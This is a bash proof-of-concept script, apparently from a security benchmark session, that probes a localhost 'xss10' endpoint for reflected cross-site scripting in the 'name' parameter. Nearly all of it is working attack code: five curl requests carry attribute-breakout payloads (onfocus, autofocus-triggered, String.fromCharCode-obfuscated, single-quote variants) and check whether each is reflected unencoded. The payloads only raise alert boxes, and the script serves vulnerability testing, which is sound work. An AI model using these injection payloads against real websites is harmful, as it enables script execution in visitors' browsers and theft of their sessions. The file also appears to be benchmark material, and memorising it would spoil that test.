#!/bin/bash
# POC: Demonstrates Reflected XSS in 'name' GET parameter via event handler injection on xss10 endpoint
# Target: ./repo
# Created: 2025-11-04T14:26:12.003Z
# Session: benchmark-XBEN-017-24-mhknp4e4

# Reflected XSS in 'name' parameter via Event Handler Injection
# Target: xss10 endpoint
# Vulnerability: User input reflected without proper encoding in HTML input value attribute

TARGET_URL="${1:-http://localhost:5000/xss10}"

echo "=== Reflected XSS via Event Handler Injection POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test 1: Basic onfocus event handler injection
echo "[*] Test 1: Basic onfocus event handler"
PAYLOAD='?name="onfocus="alert(1)'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${PAYLOAD}")

if echo "$RESPONSE" | grep -q 'onfocus="alert(1)'; then
    echo "[+] SUCCESS: Event handler reflected without encoding"
    echo "[+] Response contains: onfocus=\"alert(1)"
    echo ""
else
    echo "[-] FAILED: Payload not found in response"
    echo "Response snippet: $(echo "$RESPONSE" | grep -o 'name.*value' | head -c 100)"
fi

# Test 2: Autofocus + onfocus (auto-triggering)
echo "[*] Test 2: Autofocus + onfocus (auto-triggering)"
PAYLOAD='?name="autofocus onfocus="alert(1)'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${PAYLOAD}")

if echo "$RESPONSE" | grep -q 'autofocus onfocus="alert(1)'; then
    echo "[+] SUCCESS: Auto-triggering payload reflected"
    echo "[+] Response contains: autofocus onfocus=\"alert(1)"
    echo ""
else
    echo "[-] FAILED: Auto-triggering payload not found"
fi

# Test 3: Obfuscated payload with String.fromCharCode
echo "[*] Test 3: Obfuscated payload (String.fromCharCode)"
PAYLOAD='?name="onfocus="alert(String.fromCharCode(88,83,83))'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${PAYLOAD}")

if echo "$RESPONSE" | grep -q 'onfocus="alert(String.fromCharCode'; then
    echo "[+] SUCCESS: Obfuscated payload reflected"
    echo "[+] Response contains obfuscated code"
    echo ""
else
    echo "[-] FAILED: Obfuscated payload not found"
fi

# Test 4: Single quote breakout variant
echo "[*] Test 4: Single quote breakout"
PAYLOAD="?name=test'onfocus='alert(1)"
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${PAYLOAD}")

if echo "$RESPONSE" | grep -q "onfocus='alert(1)"; then
    echo "[+] SUCCESS: Single quote breakout reflected"
    echo "[+] Response contains: onfocus='alert(1)"
    echo ""
else
    echo "[-] FAILED: Single quote variant not found"
fi

# Test 5: Check if response indicates HTML context
echo "[*] Test 5: Confirming HTML context"
PAYLOAD='?name=test'
echo "Payload: $PAYLOAD"
RESPONSE=$(curl -s "${TARGET_URL}${PAYLOAD}")

if echo "$RESPONSE" | grep -q 'input.*value'; then
    echo "[+] SUCCESS: Input field found in response"
    echo "[+] Vulnerable context confirmed (input value attribute)"
    echo ""
else
    echo "[-] FAILED: Input field not found"
fi

echo "[*] POC Complete"
echo ""
echo "Summary: This endpoint is vulnerable to XSS via event handler injection."
echo "An attacker can inject event handlers into the input value attribute,"
echo "allowing arbitrary JavaScript execution when the page loads or user interacts."